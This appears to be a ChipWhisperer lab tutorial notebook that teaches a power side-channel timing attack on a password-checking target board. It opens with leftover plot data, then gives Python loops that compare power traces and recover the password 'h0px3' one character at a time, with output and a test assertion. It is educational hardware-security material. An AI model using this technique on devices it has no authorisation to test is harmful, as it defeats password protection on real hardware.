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","dtype":"float64","shape":[2000]}},"selected":{"id":"1164","type":"Selection"},"selection_policy":{"id":"1165","type":"UnionRenderers"}},"id":"1141","type":"ColumnDataSource"},{"attributes":{},"id":"1134","type":"CrosshairTool"},{"attributes":{"source":{"id":"1141","type":"ColumnDataSource"}},"id":"1145","type":"CDSView"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1143","type":"Line"},{"attributes":{"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1115","type":"Grid"},{"attributes":{},"id":"1160","type":"BasicTickFormatter"},{"attributes":{},"id":"1162","type":"Selection"},{"attributes":{"text":""},"id":"1156","type":"Title"},{"attributes":{},"id":"1163","type":"UnionRenderers"},{"attributes":{},"id":"1158","type":"BasicTickFormatter"},{"attributes":{"callback":null},"id":"1105","type":"DataRange1d"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1161","type":"BoxAnnotation"},{"attributes":{},"id":"1165","type":"UnionRenderers"},{"attributes":{},"id":"1164","type":"Selection"},{"attributes":{},"id":"1117","type":"BasicTicker"},{"attributes":{"formatter":{"id":"1160","type":"BasicTickFormatter"},"ticker":{"id":"1112","type":"BasicTicker"}},"id":"1111","type":"LinearAxis"},{"attributes":{},"id":"1109","type":"LinearScale"},{"attributes":{"dimension":1,"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1120","type":"Grid"},{"attributes":{"formatter":{"id":"1158","type":"BasicTickFormatter"},"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1116","type":"LinearAxis"}],"root_ids":["1102"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"3fce9700-dcf5-4e01-89da-cd2f5f482789","roots":{"1102":"92b1b2ab-fc53-4d4a-a4d4-372cef2c97e2"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

You should see both traces start and end similarly, but differ
elsewhere. If you look closely, you should see that the blue trace looks
a lot like the red trace but shifted later in time. We'll use this
timing difference to break the password!

Edit the above block to try different passwords and see how it changes
for different lengths and number of correct characters.

Go back to the original guesses (``"\n"`` and ``"h\n"``) and find some
distinct spikes that get shifted in time. Your target may differ, but in
my case, there were some distinct spikes of about -0.21 at 217 in red
and 253 in blue. The plot is interactive, so you can zoom in and move
around using the buttons on the right side of the plot. Record their
locations, value, and the difference in location (in my case, 217, 253,
-0.21, and 36).

Attacking a Single Letter
-------------------------

Now that we've located a distinctive timing difference, we can start
building our attack. We'll start with a single letter, since that will
quickly give us some feedback on the attack.

The plan for the attack is simple: keep guessing letters until we no
longer see the distinctive spike in the original location. To do this,
we'll create a loop that: \* Figures out our next guess \* Does the
capture and records the trace \* Checks if sample 217 is larger than
-0.2 (replace with appropriate values)

The below loop finds the first correct character, prints it, then ends.
You should see "Success: h" after a while.


**In [15]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    for c in trylist:
        next_pass = password + c + "\n"
        trace = cap_pass_trace(next_pass)
        if trace[121] > -0.3:
            print("Success: " + c)
            break


**Out [15]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success: a
    


Attacking the Full Password
---------------------------

Now that we can guess a single character, attacking the rest is easy; we
just need to repeat the process in another loop, move the check point
(this is the change is location you recorded earlier), and update our
guess with the new correct letter.

After updating the below script and running it, you should see parts of
the password printed out as each letter is found.


**In [16]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    def checkpass(trace, i):
        if PLATFORM == "CWNANO":
            #There's a bit of jitter
            return (trace[228 + 11*i] < 3 and trace[227 + 11*i] < 0.3)
        elif PLATFORM == "CWLITEARM" or PLATFORM == "CW308_STM32F3":
            return trace[229 + 36*i] > -0.2
        elif PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            return trace[121 + 72 * i] > -0.3
    
    for i in range(5):
        for c in trylist:
            next_pass = password + c + "\n"
            trace = cap_pass_trace(next_pass)
            if checkpass(trace, i):
                password += c
                print("Success, pass now {}".format(password))
                break


**Out [16]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0p
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0px
    




.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success, pass now h0px3
    


That's it! You should have successfully cracked a password using the
timing attack. Some notes on this method: \* The target device has a
finite start-up time, which slows down the attack. If you wish, remove
some of the ``printf()``'s from the target code, recompile and
reprogram, and see how quickly you can do this attack. \* The current
script doesn't look for the "WELCOME" message when the password is OK.
That is an extension that allows it to crack any size password. \* If
there was a lock-out on a wrong password, the system would ignore it, as
it resets the target after every attempt.

Conclusion
----------

This tutorial has demonstrated the use of the power side-channel for
performing timing attacks. A target with a simple password-based
security system is broken.


**In [17]:**

.. code:: ipython3

    scope.dis()
    target.dis()

Tests
-----


**In [18]:**

.. code:: ipython3

    assert (password == "h0px3"), "Failed to break password, got {}.\nIf on Nano, may need to rerun".format(password)


**In [ ]:**

